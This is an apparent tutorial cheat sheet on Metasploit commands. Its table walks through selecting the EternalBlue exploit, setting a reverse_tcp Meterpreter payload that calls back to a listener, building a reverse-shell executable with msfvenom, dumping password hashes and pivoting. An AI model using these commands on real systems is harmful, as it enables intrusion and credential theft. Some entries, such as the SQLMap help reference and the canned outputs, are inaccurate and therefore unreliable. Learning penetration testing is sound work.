# Metasploit

> _**"The Metasploit Framework is an essential tool for any cybersecurity professional. Its extensive exploit database and versatile platform make it invaluable for penetration testing and vulnerability assessment."**_ _**- James Lyne**_

## What is the purpose of Metasploit?

**Metasploit** is the world's leading **open-source** penetrating framework used by security engineers as a penetration testing system and a development platform that allows to create security tools and exploits. The framework makes hacking simple for both attackers and defenders.

**Here are the primary uses of Metasploit:**

- **Exploit Development:** Metasploit enables the quick generation and optimization of exploit code for Metasploit security tool users to enable the easy development of custom exploits against newly discovered vulnerabilities.
    
- **Vulnerability Scanning:** Metasploit scans comprehensively for vulnerabilities in the target system to find weaknesses.
    
- **Payload Generation and Deployment:** Metasploit can provides for payload generation and deployment, This feature enables various kinds of actions starting from remote command execution and finishing with backdoors.
    
- **Post-Exploitation Activities:** Metasploit has a number of post-exploit mission capabilities that retrieve sensitive information, which can maintain persistent access to the compromised system through backdoors until it is detected and remedied.
    
- **Automation of Repetitive Tasks:** Metasploit automates many repetitive tasks or missions involved in penetration testing process, facilitate the testing process and increasing overall efficiency.
    
- **Community and Commercial Support:** Metasploit has a helpful and large community group. Metasploit's human and financial resources make great contributions to cyber security enthusiasts who want to improve themselves. Nowadays, it is an indispensable tool for penetration testing processes.
    

## Core Features

- Exploit Development
- Payload Generation
- Post-Exploitation Modules
- Vulnerability Scanning
- Network Attacks
- Web Application Testing
- Social Engineering
- Customizable Scripts and Modules
- Database Integration
- Reporting and Documentation

## Data sources

- Vulnerability Databases
- Exploit Code
- Payloads and Shellcodes
- Network Traffic
- System Information
- User Credentials
- Web Application Data
- Configuration Files

## Common Metasploit Commands

### 1. Start the Metasploit Console

- This command launches the Metasploit console.

```
msfconsole
```

### 2. Search for Exploits

- This command allows searching in the Metasploit database for exploits, auxiliary modules, and payloads according to a given keyword. This capability saves time for Metasploit users.

```
search <keyword>
```

### 3. Use a Specific Module

- This command selects a specific exploit or auxiliary module to be used in an attack.

```
use <exploit_path>
```

### 4. Set Module Options

- This command sets the required options for the selected module, such as the target IP address and port number. It provides that the module is configured correctly before the attack begins.

```
set <option> <value>
```

### 5. Show Module Options

- This command displays configurable options of the module currently selected.

```
show options
```

### 6. Run the Exploit

- This command executes the selected exploit against the target with the configured options. It initiates the attack process.

```
run 
```

- Alternative usage:

```
exploit
```

### 7. Generate a Payload

- This command is used to create payload by specifying the format and other options of the paylad to be used in an attack. It allows the creation of customized payloads according to target systems.

```
msfvenom -p <payload> -f <format> <options>
```

### 8. List All Payloads

- This command lists all available payloads that can be used with exploits.

```
show payloads
```

### 9. Establish a Meterpreter Session

- This command enables the creation of a Meterpreter session in case of successful exploitation of a target and further post-exploitation activities. Finally, it provides an back-door for the compromised system.

```
sessions -i <session_id>
```

### 10. View Active Sessions

- This command shows the users all active sessions, providing details about each compromised target. It helps in managing multi-sessions efficiently.

```
sessions -l
```

### 11. Help and Usage Information

- This command displays the help menu and usage information for SQLMap.

```
metasploit -h
```

- Alternative usage:

```
metasploit --help
```

## Output Examples of Metasploit Commands

|Command|Example Usage|Function|Output Example|
|---|---|---|---|
|Start Metasploit|`msfconsole`|Launches the Metasploit Framework console, providing access to all Metasploit modules and tools.|`Metasploit console started.`|
|Search Exploits|`search type:exploit name:smb`|Searches for exploit modules based on a specified keyword.|`Matching Modules: 10`|
|Search Auxiliary Modules|`search type:auxiliary`|Searches for auxiliary modules within the framework.|`Matching Modules: 500`|
|Use an Exploit|`use exploit/windows/smb/ms17_010_eternalblue`|Selects a specific exploit module to be used for the attack.|`msf5 exploit(windows/smb/ms17_010_eternalblue) >`|
|Show Exploit Options|`show options`|Displays the configurable options for the currently selected exploit module.|`Module options (exploit/windows/smb/ms17_010_eternalblue): ...`|
|Set Target Host|`set RHOSTS 192.168.1.1`|Defines the remote target IP address or range for the attack.|`RHOSTS => 192.168.1.1`|
|Set Target Port|`set RPORT 445`|Specifies the remote port on the target machine.|`RPORT => 445`|
|Set Payload|`set PAYLOAD windows/meterpreter/reverse_tcp`|Configures the payload to be used after the exploit is executed.|`PAYLOAD => windows/meterpreter/reverse_tcp`|
|Set Local Host|`set LHOST 192.168.1.100`|Defines the local IP address that the payload will connect back to.|`LHOST => 192.168.1.100`|
|Set Local Port|`set LPORT 4444`|Specifies the local port that the payload will use to connect back.|`LPORT => 4444`|
|Check Target Vulnerability|`check`|Verifies if the target is vulnerable to the selected exploit.|`[+] Target is vulnerable.`|
|Exploit Target|`run` or `exploit`|Executes the selected exploit against the target.|`[*] Exploit completed, but no session was created.`|
|Show Payloads|`show payloads`|Lists all available payloads for the selected exploit.|`Available Payloads: ...`|
|Show Encoders|`show encoders`|Displays all available encoders that can be used to obfuscate payloads.|`Available Encoders: ...`|
|Show NOPs|`show nops`|Lists available NOP generators for padding payloads.|`Available NOPs: ...`|
|Show Post-Exploitation Modules|`show post`|Lists post-exploitation modules that can be used after gaining access to a target.|`Available Post Modules: ...`|
|Show Auxiliary Modules|`show auxiliary`|Lists auxiliary modules for scanning, fuzzing, or other non-exploit tasks.|`Available Auxiliary Modules: ...`|
|Set a Global Option|`setg LHOST 192.168.1.100`|Sets a global option that applies to all modules.|`LHOST => 192.168.1.100`|
|Unset a Global Option|`unsetg LHOST`|Unsets a global option, removing its value for all modules.|`LHOST unset.`|
|View Active Sessions|`sessions -l`|Lists all active sessions established with targets.|`Active sessions: 1`|
|Interact with a Session|`sessions -i 1`|Interacts with a specific session by session ID.|`meterpreter >`|
|Background a Session|`background`|Moves the current session to the background.|`[*] Backgrounding session 1...`|
|Kill a Session|`sessions -k 1`|Terminates a specific session by session ID.|`Session 1 terminated.`|
|Save Session|`sessions -s`|Saves all active sessions to disk for later use.|`Sessions saved.`|
|Load Saved Sessions|`sessions -r session_file`|Restores saved sessions from a file.|`Sessions restored.`|
|Load a Meterpreter Script|`run post/windows/gather/hashdump`|Executes a Meterpreter script for post-exploitation tasks.|`Hashes dumped.`|
|Add a Route|`route add 192.168.2.0/24 1`|Routes traffic through a compromised host.|`Route added.`|
|Display Routes|`route`|Lists all routes currently active in the session.|`Active routes: ...`|
|Pivot through a Session|`setg SESSION 1`|Sets a specific session ID for pivoting traffic.|`SESSION => 1`|
|Generate a Payload|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe`|Generates a standalone payload in a specified format.|`Payload generated.`|
|Exit Metasploit|`exit`|Exits the Metasploit console and terminates all sessions.|`Goodbye!`|